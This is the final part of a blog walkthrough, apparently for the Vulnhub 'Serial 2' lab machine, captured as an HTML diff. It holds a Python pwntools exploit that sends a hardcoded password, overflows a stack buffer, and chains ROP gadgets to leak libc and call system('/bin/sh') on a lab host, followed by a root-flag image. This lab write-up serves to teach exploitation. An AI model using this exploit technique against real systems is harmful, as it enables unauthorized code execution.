+    <span style="color:#66d9ef">while</span> <span style="color:#e6db74">&#34;password: Permission denied&#34;</span> <span style="color:#f92672">in</span> response<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>):
+        r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;j&amp;9GCS34MY+^4ud*&#34;</span>)
+        response <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>recvline()
+
+    <span style="color:#75715e"># To cause buffer overflow right up till the return address on stack.</span>
+    <span style="color:#75715e"># Then form a ROP chain.</span>
+    junk <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">72</span>
+    chain <span style="color:#f92672">=</span> junk
+    chain <span style="color:#f92672">+=</span> p64(address_gadget)
+    chain <span style="color:#f92672">+=</span> p64(got_puts)
+    chain <span style="color:#f92672">+=</span> p64(plt_puts)
+    chain <span style="color:#f92672">+=</span> p64(loop)
+    r<span style="color:#f92672">.</span>sendline(chain)
+    <span style="color:#66d9ef">print</span>(r<span style="color:#f92672">.</span>recvline())
+
+    <span style="color:#75715e"># Giving the exit command would cause this function to return, thus transferring</span>
+    <span style="color:#75715e"># control our ROP chain.</span>
+    r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;exit&#34;</span>)
+
+    <span style="color:#66d9ef">print</span>(r<span style="color:#f92672">.</span>recvline())
+    <span style="color:#66d9ef">print</span>(r<span style="color:#f92672">.</span>recvline())
+    <span style="color:#66d9ef">print</span>(r<span style="color:#f92672">.</span>recvline())
+    <span style="color:#66d9ef">print</span>(r<span style="color:#f92672">.</span>recvline())
+    <span style="color:#66d9ef">print</span>(r<span style="color:#f92672">.</span>recvline())
+
+    <span style="color:#75715e"># The last line received contains the leaked address.</span>
+    <span style="color:#75715e"># We take out the first 8 bytes, i.e. the base address.</span>
+    leak <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>recvline(False)[:<span style="color:#ae81ff">8</span>]
+    leak <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">8</span><span style="color:#f92672">-</span>len(leak))
+    puts <span style="color:#f92672">=</span> u64(leak)
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Leaked &#39;puts&#39; address: &#34;</span>, hex(puts))
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;&#39;puts&#39; offset: &#34;</span>, hex(offset_puts))
+    libc_base <span style="color:#f92672">=</span> puts <span style="color:#f92672">-</span> offset_puts
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;libc base address: &#34;</span>, hex(libc_base))
+
+    <span style="color:#75715e"># We create a new ROP chain to get the shell.</span>
+    chain <span style="color:#f92672">=</span> junk
+    chain <span style="color:#f92672">+=</span> p64(address_gadget)
+    chain <span style="color:#f92672">+=</span> p64(libc_base <span style="color:#f92672">+</span> offset_binsh)
+    chain <span style="color:#f92672">+=</span> p64(libc_base <span style="color:#f92672">+</span> offset_system)
+    chain <span style="color:#f92672">+=</span> p64(address_gadget)
+    chain <span style="color:#f92672">+=</span> p64(libc_base <span style="color:#f92672">+</span> offset_binsh)
+    chain <span style="color:#f92672">+=</span> p64(libc_base <span style="color:#f92672">+</span> offset_system)
+    r<span style="color:#f92672">.</span>sendline(chain)
+
+    <span style="color:#66d9ef">print</span>(r<span style="color:#f92672">.</span>recvline())
+    r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;exit&#34;</span>)
+    <span style="color:#66d9ef">print</span>(r<span style="color:#f92672">.</span>recvline())
+    r<span style="color:#f92672">.</span>interactive()
+
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+    r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;192.168.1.10&#34;</span>, <span style="color:#ae81ff">10000</span>)
+    exploit(r)
+</code></pre></div><p><img src="https://hexterisk.tech/blog/Serial_2/27_image.png" alt="&ldquo;pwned&rdquo;">
+<em>Root flag.</em></p>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+                <p>
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg><span class="tag"><a href="https://hexterisk.tech/blog/tags/serial2">Serial2</a></span><span class="tag"><a href="https://hexterisk.tech/blog/tags/vulnhub">Vulnhub</a></span><span class="tag"><a href="https://hexterisk.tech/blog/tags/pentesting">pentesting</a></span><span class="tag"><a href="https://hexterisk.tech/blog/tags/penetration">penetration</a></span><span class="tag"><a href="https://hexterisk.tech/blog/tags/testing">testing</a></span><span class="tag"><a href="https://hexterisk.tech/blog/tags/binary">binary</a></span>
+                </p>
+
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>1945 Words</p>
+
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>2020-05-09 05:30 &#43;0530</p>
+        </div>
+
+        
+            <div class="pagination">
+                <div class="pagination__title">
+                    <span class="pagination__title-h"></span>
+                    <hr />
+                </div>
+
+                <div class="pagination__buttons">
+                    
+
+                    
+                        <span class="button next">
+                            <a href="https://hexterisk.tech/blog/posts/2020/05/08/serial-1/">
+                                <span class="button__text">Serial 1</span>
+                                <span class="button__icon">→</span>
+                            </a>
+                        </span>
+                    
+                </div>
+            </div>
+        
+
+        
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    <div class="footer__inner">
+        <div class="footer__content">
+            
+                <span><a href="https://hexterisk.tech/blog">Bhanupratap Singh &copy; 2020</a></span>
+            
+        </div>
+    </div>
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Powered by <a href="http://gohugo.io">Hugo</a></span>
+            <span>Made with &#10084; by <a href="https://github.com/rhazdon">rhazdon</a></span>
+        </div> 
+    </div>
+    <div class="footer__inner">
+        <div class="footer__content" style="margin-bottom: -0.8rem;">
+            <span><a style="text-decoration: none;" href="http://www.catb.org/hacker-emblem/"> .</a></span>
+        </div> 
+    </div>
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span><a style="text-decoration: none;"  href="http://www.catb.org/hacker-emblem/" style="font-size: 1.4rem; margin-bottom: -1.0rem;">..:</a></span>
+        </div> 
+    </div>
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+
+<script type="text/javascript" src="https://hexterisk.tech/blog/bundle.min.2d5469329143160ae2456a69c3c76dc2d0a3b212b46afe291a51bd68650ed6f8697e001dab54f1c272c77ce08092a8c55e5bb4314e0ee334aab4b927ec896638.js" integrity="sha512-LVRpMpFDFgriRWppw8dtwtCjshK0av4pGlG9aGUO1vhpfgAdq1TxwnLHfOCAkqjFXlu0MU4O4zSqtLkn7IlmOA=="></script>
+
+
+
+    </body>
+</html>
